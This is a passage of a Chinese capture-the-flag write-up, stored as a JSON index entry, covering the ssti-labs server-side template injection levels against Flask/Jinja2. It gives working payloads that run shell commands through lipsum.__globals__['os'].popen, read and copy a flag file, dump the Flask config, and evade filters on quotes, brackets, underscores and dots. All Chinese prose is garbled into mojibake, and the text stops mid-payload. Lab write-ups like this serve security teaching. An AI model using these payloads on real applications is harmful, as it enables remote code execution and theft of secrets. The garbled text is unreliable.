[{"title":"SSTI1:ssti-labsé€šå…³wp","url":"/2025/09/15/SSTI1-ssti-labs%E9%80%9A%E5%85%B3wp/","content":"å†™åœ¨å‰é¢è¿™é‡Œç›´æ¥ç”¨çš„nssctfåœ¨çº¿å¹³å°https://www.nssctf.cn/problem/13\nä»¥ä¸‹é¢˜ç›®æˆ‘ç”¨ç®€æ´çš„payload ç»•è¿‡&#123;&#123;lipsum.__globals__['os'].popen('ls').read()&#125;&#125;\nå…¶ä¸­lipsumä¸º flaskæ¡†æ¶ å†…ç½®å‡½æ•° é€šç”¨\nå‰ç½®çŸ¥è¯†è·å–é”®å€¼æˆ–ä¸‹æ ‡dict[&#x27;__builtins__&#x27;] dict.__getitem__(&#x27;__builtins__&#x27;) dict.pop(&#x27;__builtins__&#x27;) dict.get(&#x27;__builtins__&#x27;) dict.setdefault(&#x27;__builtins__&#x27;) list[0] list.__getitem__(0) list.pop(0)\n\nè·å–å±æ€§().__class__()[&quot;__class__&quot;]()|attr(&quot;__class__&quot;)().__getattribute__(&quot;__class__&quot;)\n\nbuiltinsåœ¨ Pythonä¸­ï¼Œbuiltins æ¨¡å—æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æ¨¡å—ï¼Œå®ƒåŒ…å«äº†æ‰€æœ‰ Python å†…ç½®çš„å‡½æ•°ã€å¼‚å¸¸ã€å¸¸é‡å’Œå…¶ä»–å†…ç½®å¯¹è±¡ã€‚\nbuiltins æ¨¡å—æä¾›äº†å¯¹ Python å†…ç½®æ ‡è¯†ç¬¦çš„ç›´æ¥è®¿é—®ã€‚è¿™äº›å†…ç½®æ ‡è¯†ç¬¦åŒ…æ‹¬å¸¸ç”¨çš„å‡½æ•°ï¼ˆå¦‚ print()ã€len()ï¼‰ã€æ•°æ®ç±»å‹ï¼ˆå¦‚ int()ã€str()ï¼‰ã€å¼‚å¸¸ç±»ï¼ˆå¦‚ ValueErrorï¼‰ï¼Œä»¥åŠä¸€äº›å¸¸é‡ï¼ˆå¦‚ Trueã€Falseï¼‰ã€‚è¿™äº›å¯¹è±¡åœ¨ Python è§£é‡Šå™¨å¯åŠ¨æ—¶å°±ä¼šè‡ªåŠ¨åŠ è½½ï¼Œå› æ­¤åœ¨ä»»ä½•åœ°æ–¹éƒ½å¯ä»¥ç›´æ¥ä½¿ç”¨å®ƒä»¬ï¼Œè€Œæ— éœ€æ˜¾å¼å¯¼å…¥ã€‚\nä¾‹å¦‚,ä»¥ä¸‹ä¸¤ç§è°ƒç”¨æ–¹å¼æœ¬è´¨ä¸Šæ˜¯ä¸€è‡´çš„\n# ç›´æ¥è°ƒç”¨print(len(&#x27;abc&#x27;))  # è¾“å‡º: 3# ä½¿ç”¨ builtins æ¨¡å—import builtinsprint(builtins.len(&#x27;abc&#x27;))  # è¾“å‡º: 3\n\nå†…çœæœºåˆ¶Python çš„å†…çœï¼ˆIntrospectionï¼‰æ˜¯ä¸€ç§åŠ¨æ€è·å–å¯¹è±¡ä¿¡æ¯çš„èƒ½åŠ›ã€‚é€šè¿‡å†…çœï¼Œæˆ‘ä»¬å¯ä»¥æŸ¥çœ‹å¯¹è±¡çš„ç±»å‹ï¼ŒæŸ¥çœ‹å®ƒçš„å±æ€§å’Œæ–¹æ³•ï¼Œä»¥åŠå®ƒç»§æ‰¿çš„ç±»ç­‰ç­‰ã€‚\nä»¥ä¸‹æ˜¯ Python å†…çœçš„ä¸€äº›ä¸»è¦å·¥å…·å’ŒæŠ€æœ¯:\ndir()&gt;&gt;&gt; dir(&quot;Hello World&quot;)[&#x27;__add__&#x27;, &#x27;__class__&#x27;, &#x27;__contains__&#x27;, &#x27;__delattr__&#x27;, &#x27;__dir__&#x27;, &#x27;__doc__&#x27;, &#x27;__eq__&#x27;, &#x27;__format__&#x27;, &#x27;__ge__&#x27;, &#x27;__getattribute__&#x27;, &#x27;__getitem__&#x27;, &#x27;__getnewargs__&#x27;, &#x27;__gt__&#x27;, &#x27;__hash__&#x27;, &#x27;__init__&#x27;, &#x27;__init_subclass__&#x27;, &#x27;__iter__&#x27;, &#x27;__le__&#x27;, &#x27;__len__&#x27;, &#x27;__lt__&#x27;, &#x27;__mod__&#x27;, &#x27;__mul__&#x27;, &#x27;__ne__&#x27;, &#x27;__new__&#x27;, &#x27;__reduce__&#x27;, &#x27;__reduce_ex__&#x27;, &#x27;__repr__&#x27;, &#x27;__rmod__&#x27;, &#x27;__rmul__&#x27;, &#x27;__setattr__&#x27;, &#x27;__sizeof__&#x27;, &#x27;__str__&#x27;, &#x27;__subclasshook__&#x27;, &#x27;capitalize&#x27;, &#x27;casefold&#x27;, &#x27;center&#x27;, &#x27;count&#x27;, &#x27;encode&#x27;, &#x27;endswith&#x27;, &#x27;expandtabs&#x27;, &#x27;find&#x27;, &#x27;format&#x27;, &#x27;format_map&#x27;, &#x27;index&#x27;, &#x27;isalnum&#x27;, &#x27;isalpha&#x27;, &#x27;isdecimal&#x27;, &#x27;isdigit&#x27;, &#x27;isidentifier&#x27;, &#x27;islower&#x27;, &#x27;isnumeric&#x27;, &#x27;isprintable&#x27;, &#x27;isspace&#x27;, &#x27;istitle&#x27;, &#x27;isupper&#x27;, &#x27;join&#x27;, &#x27;ljust&#x27;, &#x27;lower&#x27;, &#x27;lstrip&#x27;, &#x27;maketrans&#x27;, &#x27;partition&#x27;, &#x27;replace&#x27;, &#x27;rfind&#x27;, &#x27;rindex&#x27;, &#x27;rjust&#x27;, &#x27;rpartition&#x27;, &#x27;rsplit&#x27;, &#x27;rstrip&#x27;, &#x27;split&#x27;, &#x27;splitlines&#x27;, &#x27;startswith&#x27;, &#x27;strip&#x27;, &#x27;swapcase&#x27;, &#x27;title&#x27;, &#x27;translate&#x27;, &#x27;upper&#x27;, &#x27;zfill&#x27;]\n\ngetattr(), setattr(), hasattr(), delattr()è¿™äº›å†…ç½®å‡½æ•°ç”¨äºè·å–ã€è®¾ç½®ã€æ£€æŸ¥å’Œåˆ é™¤å¯¹è±¡çš„å±æ€§\nç®€å•ä¾‹å­:\nclass MyClass:  def __init__(self):    self.my_attribute = 123my_instance = MyClass()&gt;&gt;&gt; getattr(my_instance, &#x27;my_attribute&#x27;)123&gt;&gt;&gt; setattr(my_instance, &#x27;my_attribute&#x27;, 456)&gt;&gt;&gt; print(my_instance.my_attribute)456&gt;&gt;&gt; hasattr(my_instance, &#x27;my_attribute&#x27;)True&gt;&gt;&gt; delattr(my_instance, &#x27;my_attribute&#x27;)&gt;&gt;&gt; hasattr(my_instance, &#x27;my_attribute&#x27;)False\n\nhelp()è¿™ä¸ªå‡½æ•°æä¾›äº†å…³äºä¸€ä¸ªå¯¹è±¡ï¼ˆå¦‚ç±»ã€æ–¹æ³•ã€æ¨¡å—ç­‰ï¼‰çš„è¯¦ç»†ä¿¡æ¯ã€‚\nä¾‹å¦‚:\né€šè¿‡ help å‡½æ•°å¯ä»¥æ‰¾åˆ°è¿™ä¸ªç±»æ‰€æœ‰çš„æ–¹æ³•å®šä¹‰ä»¥åŠå±æ€§, å¯ä»¥çœ‹åˆ°å…¶ä¸­æœ‰å¾ˆå¤šä»¥ __ å¼€å¤´çš„å‡½æ•°å’Œå±æ€§, è¿™äº›å‡½æ•°å’Œå±æ€§è¢«ç§°ä¸ºé­”æœ¯æ–¹æ³•&#x2F;å±æ€§.\nglobals()ä¼šä»¥å­—å…¸ç±»å‹è¿”å›å½“å‰ä½ç½®çš„å…¨éƒ¨å…¨å±€å˜é‡\nä¸‹é¢æ˜¯èœé¸Ÿæ•™ç¨‹çš„ä¸€ä¸ªä¾‹å­\n&gt;&gt;&gt;a=&#x27;runoob&#x27;&gt;&gt;&gt; print(globals()) # globals å‡½æ•°è¿”å›ä¸€ä¸ªå…¨å±€å˜é‡çš„å­—å…¸ï¼ŒåŒ…æ‹¬æ‰€æœ‰å¯¼å…¥çš„å˜é‡ã€‚&#123;&#x27;__builtins__&#x27;: &lt;module &#x27;__builtin__&#x27; (built-in)&gt;, &#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;a&#x27;: &#x27;runoob&#x27;, &#x27;__package__&#x27;: None&#125;\n\nvars()è¿”å›å¯¹è±¡objectçš„å±æ€§å’Œå±æ€§å€¼çš„å­—å…¸å¯¹è±¡\n&gt;&gt;&gt;print(vars())&#123;&#x27;__builtins__&#x27;: &lt;module &#x27;__builtin__&#x27; (built-in)&gt;, &#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None&#125;&gt;&gt;&gt; class Runoob:...     a = 1... &gt;&gt;&gt; print(vars(Runoob))&#123;&#x27;a&#x27;: 1, &#x27;__module__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None&#125;&gt;&gt;&gt; runoob = Runoob()&gt;&gt;&gt; print(vars(runoob))&#123;&#125;\n\npython é­”æœ¯æ–¹æ³•&#x2F;å±æ€§__builtins__ä¸€ä¸ª builtins æ¨¡å—çš„ä¸€ä¸ªå¼•ç”¨ï¼Œå…¶ä¸­åŒ…å« Python çš„å†…ç½®åç§°ã€‚è¿™ä¸ªæ¨¡å—è‡ªåŠ¨åœ¨æ‰€æœ‰æ¨¡å—çš„å…¨å±€å‘½åç©ºé—´ä¸­å¯¼å…¥ã€‚å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ import builtins æ¥å¯¼å…¥\nå®ƒåŒ…å«è®¸å¤šåŸºæœ¬å‡½æ•°ï¼ˆå¦‚ printã€len ç­‰ï¼‰å’ŒåŸºæœ¬ç±»ï¼ˆå¦‚ objectã€intã€list ç­‰ï¼‰ã€‚è¿™å°±æ˜¯å¯ä»¥åœ¨ Python è„šæœ¬ä¸­ç›´æ¥ä½¿ç”¨ printã€len ç­‰å‡½æ•°ï¼Œè€Œæ— éœ€å¯¼å…¥ä»»ä½•æ¨¡å—çš„åŸå› ã€‚\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨ dir() æŸ¥çœ‹å½“å‰æ¨¡å—çš„å±æ€§åˆ—è¡¨. å…¶ä¸­å°±å¯ä»¥çœ‹åˆ° __builtins__\n&gt;&gt;&gt; dir()[&#x27;__annotations__&#x27;, &#x27;__builtins__&#x27;, &#x27;__doc__&#x27;, &#x27;__loader__&#x27;, &#x27;__name__&#x27;, &#x27;__package__&#x27;, &#x27;__spec__&#x27;, &#x27;subprocess&#x27;]\n\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨ dir(__builtins__) æ¥æŸ¥çœ‹ __builtins__ ä¸­åŒ…å«çš„å‡½æ•°.\n&gt;&gt;&gt; dir(__builtins__)[&#x27;ArithmeticError&#x27;, &#x27;AssertionError&#x27;, &#x27;AttributeError&#x27;, &#x27;BaseException&#x27;, &#x27;BaseExceptionGroup&#x27;, &#x27;BlockingIOError&#x27;, &#x27;BrokenPipeError&#x27;, &#x27;BufferError&#x27;, &#x27;BytesWarning&#x27;, &#x27;ChildProcessError&#x27;, &#x27;ConnectionAbortedError&#x27;, &#x27;ConnectionError&#x27;, &#x27;ConnectionRefusedError&#x27;, &#x27;ConnectionResetError&#x27;, &#x27;DeprecationWarning&#x27;, &#x27;EOFError&#x27;, &#x27;Ellipsis&#x27;, &#x27;EncodingWarning&#x27;, &#x27;EnvironmentError&#x27;, &#x27;Exception&#x27;, &#x27;ExceptionGroup&#x27;, &#x27;False&#x27;, &#x27;FileExistsError&#x27;, &#x27;FileNotFoundError&#x27;, &#x27;FloatingPointError&#x27;, &#x27;FutureWarning&#x27;, &#x27;GeneratorExit&#x27;, &#x27;IOError&#x27;, &#x27;ImportError&#x27;, &#x27;ImportWarning&#x27;, &#x27;IndentationError&#x27;, &#x27;IndexError&#x27;, &#x27;InterruptedError&#x27;, &#x27;IsADirectoryError&#x27;, &#x27;KeyError&#x27;, &#x27;KeyboardInterrupt&#x27;, &#x27;LookupError&#x27;, &#x27;MemoryError&#x27;, &#x27;ModuleNotFoundError&#x27;, &#x27;NameError&#x27;, &#x27;None&#x27;, &#x27;NotADirectoryError&#x27;, &#x27;NotImplemented&#x27;, &#x27;NotImplementedError&#x27;, &#x27;OSError&#x27;, &#x27;OverflowError&#x27;, &#x27;PendingDeprecationWarning&#x27;, &#x27;PermissionError&#x27;, &#x27;ProcessLookupError&#x27;, &#x27;RecursionError&#x27;, &#x27;ReferenceError&#x27;, &#x27;ResourceWarning&#x27;, &#x27;RuntimeError&#x27;, &#x27;RuntimeWarning&#x27;, &#x27;StopAsyncIteration&#x27;, &#x27;StopIteration&#x27;, &#x27;SyntaxError&#x27;, &#x27;SyntaxWarning&#x27;, &#x27;SystemError&#x27;, &#x27;SystemExit&#x27;, &#x27;TabError&#x27;, &#x27;TimeoutError&#x27;, &#x27;True&#x27;, &#x27;TypeError&#x27;, &#x27;UnboundLocalError&#x27;, &#x27;UnicodeDecodeError&#x27;, &#x27;UnicodeEncodeError&#x27;, &#x27;UnicodeError&#x27;, &#x27;UnicodeTranslateError&#x27;, &#x27;UnicodeWarning&#x27;, &#x27;UserWarning&#x27;, &#x27;ValueError&#x27;, &#x27;Warning&#x27;, &#x27;ZeroDivisionError&#x27;, &#x27;_&#x27;, &#x27;__build_class__&#x27;, &#x27;__debug__&#x27;, &#x27;__doc__&#x27;, &#x27;__import__&#x27;, &#x27;__loader__&#x27;, &#x27;__name__&#x27;, &#x27;__package__&#x27;, &#x27;__spec__&#x27;, &#x27;abs&#x27;, &#x27;aiter&#x27;, &#x27;all&#x27;, &#x27;anext&#x27;, &#x27;any&#x27;, &#x27;ascii&#x27;, &#x27;bin&#x27;, &#x27;bool&#x27;, &#x27;breakpoint&#x27;, &#x27;bytearray&#x27;, &#x27;bytes&#x27;, &#x27;callable&#x27;, &#x27;chr&#x27;, &#x27;classmethod&#x27;, &#x27;compile&#x27;, &#x27;complex&#x27;, &#x27;copyright&#x27;, &#x27;credits&#x27;, &#x27;delattr&#x27;, &#x27;dict&#x27;, &#x27;dir&#x27;, &#x27;divmod&#x27;, &#x27;enumerate&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;exit&#x27;, &#x27;filter&#x27;, &#x27;float&#x27;, &#x27;format&#x27;, &#x27;frozenset&#x27;, &#x27;getattr&#x27;, &#x27;globals&#x27;, &#x27;hasattr&#x27;, &#x27;hash&#x27;, &#x27;help&#x27;, &#x27;hex&#x27;, &#x27;id&#x27;, &#x27;input&#x27;, &#x27;int&#x27;, &#x27;isinstance&#x27;, &#x27;issubclass&#x27;, &#x27;iter&#x27;, &#x27;len&#x27;, &#x27;license&#x27;, &#x27;list&#x27;, &#x27;locals&#x27;, &#x27;map&#x27;, &#x27;max&#x27;, &#x27;memoryview&#x27;, &#x27;min&#x27;, &#x27;next&#x27;, &#x27;object&#x27;, &#x27;oct&#x27;, &#x27;open&#x27;, &#x27;ord&#x27;, &#x27;pow&#x27;, &#x27;print&#x27;, &#x27;property&#x27;, &#x27;quit&#x27;, &#x27;range&#x27;, &#x27;repr&#x27;, &#x27;reversed&#x27;, &#x27;round&#x27;, &#x27;set&#x27;, &#x27;setattr&#x27;, &#x27;slice&#x27;, &#x27;sorted&#x27;, &#x27;staticmethod&#x27;, &#x27;str&#x27;, &#x27;sum&#x27;, &#x27;super&#x27;, &#x27;tuple&#x27;, &#x27;type&#x27;, &#x27;vars&#x27;, &#x27;zip&#x27;]\n\n__builtins__ ä»…ä»…æ˜¯ builtins æ¨¡å—çš„å¼•ç”¨ï¼Œå®é™…ä¸Šæ˜¯ä»¥ dict çš„å½¢å¼å®ç°çš„.\n__import____import__æ¥æ”¶å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ï¼Œå¯¼å…¥è¯¥å­—ç¬¦ä¸²åç§°çš„æ¨¡å—ã€‚\nå¦‚import sysç›¸å½“äº__import__(&#39;sys&#39;)ï¼Œå¦å¤–ç”±äºå‚æ•°æ˜¯å­—ç¬¦ä¸²çš„å½¢å¼ï¼Œå› æ­¤åœ¨æŸäº›æƒ…å†µä¸‹å¯åˆ©ç”¨å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼Bypassè¿‡æ»¤,æ¯”å¦‚:\n__import__(&#x27;o&#x27;+&#x27;s&#x27;).system(&#x27;ca&#x27;+&#x27;lc&#x27;)\n\n__class__ç”¨äºè·å–å¯¹è±¡çš„ç±»,ä¾‹å¦‚:\n&#x27;&#x27;.__class__ &quot;&quot;&quot;&lt;class &#x27;str&#x27;&gt;&quot;&quot;&quot;\n\n__bases__åˆ—å‡ºå½“å‰å¯¹è±¡çš„åŸºç±»\nprint(&#x27;&#x27;.__class__.__bases__)&quot;&quot;&quot;(&lt;class &#x27;object&#x27;&gt;,)&quot;&quot;&quot;\n\n__mro__ç”¨äºå±•ç¤ºç±»çš„ç»§æ‰¿å…³ç³»ï¼Œç±»ä¼¼äº bases:\nprint(&#x27;&#x27;.__class__.__mro__)&quot;&quot;&quot;(&lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)&quot;&quot;&quot;\n\n__globals____globals__æ˜¯ä¸€ä¸ªç‰¹æ®Šå±æ€§ï¼Œèƒ½å¤Ÿä»¥ dict çš„å½¢å¼è¿”å›å‡½æ•°ï¼ˆæ³¨æ„æ˜¯å‡½æ•°ï¼‰æ‰€åœ¨æ¨¡å—å‘½åç©ºé—´çš„æ‰€æœ‰å˜é‡ï¼Œå…¶ä¸­åŒ…å«äº†å¾ˆå¤šå·²ç»å¼•å…¥çš„ modulesã€‚\næ³¨æ„ï¼ŒæŸäº›å†…ç½®å‡½æ•°å¹¶æ²¡æœ‰ __globals__å±æ€§ï¼Œå› ä¸ºè¿™äº›å‡½æ•°å¹¶ä¸æ˜¯ Python ä»£ç å®šä¹‰çš„ï¼Œè€Œæ˜¯ç”¨ C è¯­è¨€æˆ–å…¶ä»–åº•å±‚è¯­è¨€å®ç°çš„ï¼Œä¾‹å¦‚ os.system å‡½æ•°\nclass TestClass:    def test(self):        a = 1        b = 2        return a,bprint(TestClass.test.__globals__)def test():    a = 1    b = 2    return a,bprint(test.__globals__)import osprint(os.system.__globals__)&quot;&quot;&quot;&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;_frozen_importlib_external.SourceFileLoader object at 0x0000000000EE3A50&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;__file__&#x27;: &#x27;d:\\\\Problems\\\\moe\\\\week5\\\\pyjail4.py&#x27;, &#x27;__cached__&#x27;: None, &#x27;TestClass&#x27;: &lt;class &#x27;__main__.TestClass&#x27;&gt;&#125;&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;_frozen_importlib_external.SourceFileLoader object at 0x0000000000EE3A50&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;__file__&#x27;: &#x27;d:\\\\Problems\\\\moe\\\\week5\\\\pyjail4.py&#x27;, &#x27;__cached__&#x27;: None, &#x27;TestClass&#x27;: &lt;class &#x27;__main__.TestClass&#x27;&gt;, &#x27;test&#x27;: &lt;function test at 0x0000000000E904A0&gt;&#125;Traceback (most recent call last):  File &quot;d:\\Problems\\moe\\week5\\pyjail4.py&quot;, line 15, in &lt;module&gt;    print(os.system.__globals__)          ^^^^^^^^^^^^^^^^^^^^^AttributeError: &#x27;builtin_function_or_method&#x27; object has no attribute &#x27;__globals__&#x27;&quot;&quot;&quot;\n\nsubclasseså¯ä»¥è·å–åˆ°æŸä¸ªç±»æ‰€æœ‰å­ç±»\nimport requestsclass Father(requests.Session):    def test():        passclass Son(Father):    def test():        passprint(Father.__subclasses__())print(requests.Session.__subclasses__())&quot;&quot;&quot;[&lt;class &#x27;__main__.Son&#x27;&gt;][&lt;class &#x27;__main__.Father&#x27;&gt;]&quot;&quot;&quot;\n\n__dict__ä»¥å­—å…¸å½¢å¼å­˜å‚¨å¯¹è±¡çš„å¯å†™å±æ€§ã€‚æ¯ä¸ªå¯¹è±¡ï¼ˆåŒ…æ‹¬ç±»ã€å®ä¾‹ã€æ¨¡å—ç­‰ï¼‰éƒ½æœ‰è‡ªå·±çš„ __dict__ å±æ€§ï¼Œé€šå¸¸ç”¨äºä¿å­˜è¯¥å¯¹è±¡çš„å‘½åç©ºé—´ï¼Œå³ä¸è¯¥å¯¹è±¡ç›¸å…³çš„æ‰€æœ‰å±æ€§å’Œå€¼ã€‚\næ¯”å¦‚å½“æˆ‘ä»¬å°† flag å­—ç¬¦å£°æ˜åœ¨ __main__ æ¨¡å—æ—¶ï¼Œå°±å¯ä»¥åœ¨ __main__ æ¨¡å—çš„ __dict__ å±æ€§ä¸­æ‰¾åˆ°ï¼Œä¸ globals() å‡½æ•°çš„è¿”å›ç»“æœä¸€è‡´ã€‚\nimport syssys.modules[&#x27;__main__&#x27;].__dict__ == globals()# True\n\nå…¶ä»–__del__ï¼šä¸€ä¸ªç±»çš„ææ„å‡½æ•°ï¼Œå½“ä¸€ä¸ªå¯¹è±¡è¢«é”€æ¯æ—¶ï¼Œå®ƒä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚__str__ å’Œ __repr__ï¼šè¿™ä¸¤ä¸ªæ–¹æ³•ç”¨äºå®šä¹‰å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼ã€‚__str__ æ˜¯åœ¨ä½¿ç”¨ str() å‡½æ•°æˆ– print è¯­å¥æ—¶è¢«è°ƒç”¨çš„ï¼Œè€Œ __repr__ æ˜¯åœ¨ä½¿ç”¨ repr() å‡½æ•°æ—¶è¢«è°ƒç”¨çš„ã€‚å¦‚æœ __str__ æ²¡æœ‰è¢«å®šä¹‰ï¼Œé‚£ä¹ˆåœ¨éœ€è¦çš„æ—¶å€™ä¼šä½¿ç”¨ __repr__ã€‚__eq__, __ne__, __lt__, __gt__, __le__, __ge__ï¼šè¿™äº›æ–¹æ³•ç”¨äºå®šä¹‰å¯¹è±¡çš„æ¯”è¾ƒæ“ä½œã€‚__add__, __sub__, __mul__, __div__, __mod__, __pow__ï¼šè¿™äº›æ–¹æ³•ç”¨äºå®šä¹‰æ•°å­¦è¿ç®—ç¬¦çš„è¡Œä¸ºã€‚__getitem__, __setitem__, __delitem__ï¼šè¿™äº›æ–¹æ³•ç”¨äºæ”¯æŒç±»ä¼¼å­—å…¸çš„ç´¢å¼•å’Œåˆ‡ç‰‡æ“ä½œã€‚__iter__ å’Œ __next__ï¼šè¿™ä¸¤ä¸ªæ–¹æ³•ç”¨äºå®šä¹‰ä¸€ä¸ªè¿­ä»£å™¨ã€‚__call__ï¼šè¿™ä¸ªæ–¹æ³•ä½¿å¾—ä¸€ä¸ªå®ä¾‹å¯ä»¥åƒå‡½æ•°ä¸€æ ·è¢«è°ƒç”¨ã€‚__getattr__, __setattr__, __delattr__ï¼šè¿™äº›æ–¹æ³•ç”¨äºæ§åˆ¶å±æ€§è®¿é—®ã€‚\n\nå…³å¡Level 1 no waf&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;cat /app/flag&#x27;).read()&#125;&#125;\n\n\nSSTILAB&#123;enjoy_flask_ssti&#125;\n\nLevel 2&#123;%%&#125;å¯ä»¥ç”¨æ¥å£°æ˜å˜é‡ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç”¨äºå¾ªç¯è¯­å¥å’Œæ¡ä»¶è¯­å¥ã€‚&#123;&#123;&#125;&#125;ç”¨äºå°†è¡¨è¾¾å¼æ‰“å°åˆ°æ¨¡æ¿è¾“å‡º&#123;##&#125;è¡¨ç¤ºæœªåŒ…å«åœ¨æ¨¡æ¿è¾“å‡ºä¸­çš„æ³¨é‡Š\\##å¯ä»¥æœ‰å’Œ&#123;%%&#125;ç›¸åŒçš„æ•ˆæœ&#123;&#123;&#125;&#125; ç­‰ä»·äº &#123;%print%&#125;\n\n&#123;%print lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;cat /app/flag&#x27;).read()%&#125;\n\n\nSSTILAB&#123;enjoy_flask_ssti&#125;\n\nLevel 3 no waf and blindä¸Šä¸€é¢˜çš„payloadæ‰“ä¸é€š\n\næ­£ç¡®ä½†æ˜¯æ²¡æœ‰flagå›æ˜¾,å°è¯•å†™é™æ€æ–‡ä»¶\n&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;echo &quot;test&quot; &gt;/app/static/1.txt&#x27;).read()&#125;&#125;\n\n\næˆåŠŸå†™å…¥,ç„¶åç›´æ¥è¯»flagå³å¯\n&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;echo `cat /app/flag` &gt;/app/static/2.txt&#x27;).read()&#125;&#125;\n\n\nSSTILAB&#123;enjoy_flask_ssti&#125;\n\nLevel 4æŠŠä¸­æ‹¬å·è¿‡æ»¤äº†,ä½†æ˜¯ç”±äº__globals__è¿”å›çš„æ˜¯ä¸€ä¸ªå­—å…¸,å¯ä»¥é€šè¿‡.getæ–¹å¼å¾—åˆ°å€¼\nå›é¡¾:\ndict[&#x27;__builtins__&#x27;] dict.__getitem__(&#x27;__builtins__&#x27;) dict.pop(&#x27;__builtins__&#x27;) dict.get(&#x27;__builtins__&#x27;) dict.setdefault(&#x27;__builtins__&#x27;) list[0] list.__getitem__(0) list.pop(0)\n\n&#123;&#123;lipsum.__globals__.get(&#x27;os&#x27;).popen(&#x27;echo `cat /app/flag` &gt;/app/static/2.txt&#x27;).read()&#125;&#125;\n\n\nLevel 5è¿‡æ»¤å¼•å·,å¯ä»¥æ›¿æ¢ä¸º request.args.å‚æ•°åï¼ˆgetæ–¹å¼ï¼‰\n&#123;&#123;lipsum.__globals__[request.args.x1].popen(request.args.x2).read()&#125;&#125;\n\n\nLevel 6è¿‡æ»¤ä¸‹åˆ’çº¿,å¯ä»¥ç¼–ç ç»•è¿‡,æ¯”å¦‚unicode,hexç¼–ç \n&#123;&#123;lipsum[&#x27;\\x5f\\x5fglobals\\x5f\\x5f&#x27;][&#x27;os&#x27;].popen(&#x27;cat /app/flag&#x27;).read()&#125;&#125;\n\n\nLevel 7è¿‡æ»¤ç‚¹å·,ç”¨[]ä»£æ›¿.\nå…¶ä»–æ–¹æ³•å‚è€ƒè·å–å±æ€§çš„å››ç§æ–¹æ³•\n&#123;&#123;lipsum[&#x27;__globals__&#x27;][&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;cat /app/flag&#x27;)[&#x27;read&#x27;]()&#125;&#125;\n\n\nLevel 8+å·è¿æ¥å­—ç¬¦ä¸²å³å¯\n&#123;&#123;lipsum[&#x27;__glob&#x27;+&#x27;als__&#x27;][&#x27;os&#x27;][&#x27;pop&#x27;+&#x27;en&#x27;](&#x27;ls&#x27;).read()&#125;&#125;\n\n\nLevel 9åˆšæ‰ç”¨çš„payloadå‹æ ¹æ²¡æœ‰æ•°å­—\n&#123;&#123;lipsum[&#x27;__glob&#x27;+&#x27;als__&#x27;][&#x27;os&#x27;][&#x27;pop&#x27;+&#x27;en&#x27;](&#x27;cat /app/flag&#x27;).read()&#125;&#125;\n\n\nLevel 10 set config &#x3D; Noneè¿™é¢˜çš„ç›®çš„æ˜¯å¾—åˆ°configçš„å†…å®¹,ç›´æ¥æ²¡æœ‰å›æ˜¾\né€šè¿‡current_appæ‹¿åˆ°config\ncurrent_app æ˜¯Flaskä¸­çš„ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œä»£è¡¨å½“å‰è¿è¡Œçš„Flaskåº”ç”¨å®ä¾‹\n&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;\n\n\nLevel 11ban äº† . []å¦‚ä½•å–å±æ€§ ï¼Ÿ\né€šè¿‡ |attr()\nå¦‚ä½•å–é”®å€¼ ï¼Ÿ\né€šè¿‡ __getitem__(&#39;key&#39;)\nç„¶åç”¨ &#123;%set %&#125;å’Œ|joinè¿‡æ»¤å™¨æ‹¼æ¥\nè¿‡æ»¤å™¨æ˜¯é€šè¿‡|è¿›è¡Œä½¿ç”¨çš„ï¼Œä¾‹å¦‚&#123;&#123; name|length &#125;&#125;,å°†è¿”å›nameçš„é•¿åº¦ï¼Œè¿‡æ»¤å™¨ç›¸å½“äºæ˜¯ä¸€ä¸ªå‡½æ•°ï¼ŒæŠŠå½“å‰çš„çš„å˜é‡ä¼ å…¥åˆ°è¿‡æ»¤å™¨ä¸­ï¼Œç„¶åè¿‡æ»¤å™¨æ ¹æ®è‡ªå·±çš„åŠŸèƒ½ï¼Œå†è¿”å›ç›¸åº”çš„å€¼ï¼Œä¹‹åå†æ¸²æŸ“åˆ°æ¨¡æ¿é¡µé¢ä¸­\nä»æœ€åŸºæœ¬çš„payloadå‡ºå‘:\n&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;\n\n&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;a.æ„é€ __globals__&#123;%set a=dict(__glo=a,bals__=a)|join%&#125;b.æ„é€ os&#123;%set b=dict(o=a,s=a)|join%&#125;c.æ„é€ popen&#123;%set c=dict(po=a,pen=a)|join%&#125;cmd.æ„é€ ls&#123;%set cmd=dict(l=a,s=a)|join%&#125;d.æ„é€ read&#123;%set d=dict(re=a.ad=a)|join%&#125;e.æ„é€ __getitem__&#123;%set 